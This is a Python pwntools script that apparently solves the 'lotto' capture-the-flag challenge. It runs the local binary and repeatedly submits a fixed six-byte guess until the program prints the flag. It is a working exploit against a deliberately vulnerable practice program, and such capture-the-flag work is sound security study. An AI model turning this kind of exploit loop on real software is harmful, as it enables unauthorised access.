import sys
from pwn import *


n = len(sys.argv)
if n < 2:
    print("[-] Missing argument!")
    print("[-] Insert Working Directory")
    print("[-] python3 exploit.py <dir>")
    quit(0)


print("[+] Setting working dir -> " + str(sys.argv[1]))

input_line = chr(23) * 6
encoded_number = input_line.encode()

opt = str(1).encode()

cmd = sys.argv[1]
if cmd[-1] == '/':
    cmd = cmd + "lotto"
else:
    cmd = cmd + "/lotto"

# bad_input = "qwerty".encode()
p = process(cmd, cwd=sys.argv[1])
temp = p.recv()

c = 0
r = 0
print("[+] Starting loop...")
while True:
    if c == 10:
        r += 1
        print("[+] Attempt: " + str(c * r))
        c = 0

    p.sendline(opt)
    temp = p.recv()
    print(temp)
    p.sendline(encoded_number)
    temp = p.recvline()
    res = p.recvline()
    if "bad" not in res.decode('utf-8'):
        print("Flag: " + str(res.decode('utf-8')))
        quit(0)
    temp = p.recv()
    c += 1